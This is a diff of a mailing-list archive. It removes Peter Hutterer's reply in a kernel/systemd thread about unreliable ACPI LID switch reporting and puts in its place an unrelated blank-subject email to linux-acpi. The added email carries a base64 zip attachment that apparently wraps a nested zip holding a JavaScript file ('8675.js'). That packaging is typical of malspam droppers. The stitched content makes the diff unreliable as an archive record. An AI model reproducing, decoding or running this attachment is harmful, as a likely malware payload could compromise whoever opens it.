@@ -1,98 +1,105 @@
-From: Peter Hutterer <peter.hutterer@who-t.net>
-Subject: Re: [systemd-devel] [WIP PATCH 0/4] Rework the unreliable LID switch
- exported by ACPI
-Date: Thu, 15 Jun 2017 17:57:55 +1000
-Message-ID: <20170615075755.GA10001@jelly>
-References: <20170601184632.2980-1-benjamin.tissoires@redhat.com>
- <20170607074848.GE27006@gardel-login>
- <20170613100617.GD29589@mail.corp.redhat.com>
- <1AE640813FDE7649BE1B193DEA596E886CED0386@SHSMSX101.ccr.corp.intel.com>
- <20170615064715.GA6195@jelly>
- <1AE640813FDE7649BE1B193DEA596E886CED047B@SHSMSX101.ccr.corp.intel.com>
+From: <ecaterinasuciu09@yahoo.com>
+Subject: (unknown)
+Date: Thu, 15 Jun 2017 08:37:58 -0000
+Message-ID: <149751587828.19456.9968248422883820408@iol.cz>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Return-path: <linux-input-owner@vger.kernel.org>
-Content-Disposition: inline
-In-Reply-To: <1AE640813FDE7649BE1B193DEA596E886CED047B@SHSMSX101.ccr.corp.intel.com>
-Sender: linux-input-owner@vger.kernel.org
-To: "Zheng, Lv" <lv.zheng@intel.com>
-Cc: Benjamin Tissoires <benjamin.tissoires@redhat.com>, Lennart Poettering <mzxreary@0pointer.de>, "Wysocki, Rafael J" <rafael.j.wysocki@intel.com>, "Rafael J . Wysocki" <rjw@rjwysocki.net>, "Brown, Len" <len.brown@intel.com>, Lv Zheng <zetalog@gmail.com>, "linux-acpi@vger.kernel.org" <linux-acpi@vger.kernel.org>, "systemd-devel@lists.freedesktop.org" <systemd-devel@lists.freedesktop.org>, "linux-kernel@vger.kernel.org" <linux-kernel@vger.kernel.org>, "linux-input@vger.kernel.org" <linux-input@vger.kernel.org>
+Content-Type: application/zip; name="57413395.zip"
+Content-Transfer-Encoding: base64
+Return-path: <linux-acpi-owner@vger.kernel.org>
+Received: from 208.191.broadband10.iol.cz ([90.177.191.208]:39681 "HELO iol.cz"
+        rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with SMTP
+        id S1750774AbdFOIiB (ORCPT <rfc822;linux-acpi@vger.kernel.org>);
+        Thu, 15 Jun 2017 04:38:01 -0400
+Subject: 
+Content-Disposition: attachment
+Sender: linux-acpi-owner@vger.kernel.org
 List-Id: linux-acpi@vger.kernel.org
+To: linux-acpi@vger.kernel.org
 
-On Thu, Jun 15, 2017 at 07:33:58AM +0000, Zheng, Lv wrote:
-> Hi, Peter
-> 
-> > From: Peter Hutterer [mailto:peter.hutterer@who-t.net]
-> > Subject: Re: [systemd-devel] [WIP PATCH 0/4] Rework the unreliable LID switch exported by ACPI
-> > 
-> > On Thu, Jun 15, 2017 at 02:52:57AM +0000, Zheng, Lv wrote:
-> > > Hi, Benjamin
-> > >
-> > > > From: Benjamin Tissoires [mailto:benjamin.tissoires@redhat.com]
-> > > > Subject: Re: [systemd-devel] [WIP PATCH 0/4] Rework the unreliable LID switch exported by ACPI
-> > > >
-> > > > Hi,
-> > > >
-> > > > [Sorry for the delay, I have been sidetracked from this]
-> > > >
-> > > > On Jun 07 2017 or thereabouts, Lennart Poettering wrote:
-> > > > > On Thu, 01.06.17 20:46, Benjamin Tissoires (benjamin.tissoires@redhat.com) wrote:
-> > > > >
-> > > > > > Hi,
-> > > > > >
-> > > > > > Sending this as a WIP as it still need a few changes, but it mostly works as
-> > > > > > expected (still not fully compliant yet).
-> > > > > >
-> > > > > > So this is based on Lennart's comment in [1]: if the LID state is not reliable,
-> > > > > > the kernel should not export the LID switch device as long as we are not sure
-> > > > > > about its state.
-> > > > >
-> > > > > Ah nice! I (obviously) like this approach.
-> > > >
-> > > > Heh. Now I just need to convince Lv that it's the right approach.
-> > >
-> > > I feel we don't have big conflicts.
-> > > And I already took part of your idea into this patchset:
-> > > https://patchwork.kernel.org/patch/9771121/
-> > > https://patchwork.kernel.org/patch/9771119/
-> > > I tested my surface pros with Ubuntu, they are working as expected.
-> > >
-> > > > > > Note that systemd currently doesn't sync the state when the input node just
-> > > > > > appears. This is a systemd bug, and it should not be handled by the kernel
-> > > > > > community.
-> > > > >
-> > > > > Uh if this is borked, we should indeed fix this in systemd. Is there
-> > > > > already a systemd github bug about this? If not, please create one,
-> > > > > and we'll look into it!
-> > > >
-> > > > I don't think there is. I haven't raised it yet because I am not so sure
-> > > > this will not break again those worthless unreliable LID, and if we play
-> > > > whack a mole between the kernel and user space, things are going to be
-> > > > nasty. So I'd rather have this fixed in systemd along with the
-> > > > unreliable LID switch knowledge, so we are sure that the kernel behaves
-> > > > the way we expect it to be.
-> > >
-> > > This is my feeling:
-> > > We needn't go that far.
-> > > We can interpret "input node appears" into "default input node state".
-> > 
-> > Sorry, can you clarify this bit please? I'm not sure what you mean here.
-> > Note that there's an unknown amount of time between "device node appearing
-> > in the system" and when a userspace process actually opens it and looks at
-> > its state. By then, the node may have changed state again.
-> 
-> We can see:
-> "logind" has already implemented a timeout, and will not respond lid state
-> unless it can be stable within this timeout period.
-> I'm not an expert of logind, maybe this is because of "HoldOffTimeoutSec"?
-> 
-> I feel "removing the input node for a period where its state is not trustful"
-> is technically identical to this mechanism.
-
-but you'd be making kernel policy based on one userspace implementation.
-e.g. libinput doesn't have a timeout period, it assumes the state is
-correct when an input node is present. 
-
-Cheers,
-   Peter
-
+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
+AAAA
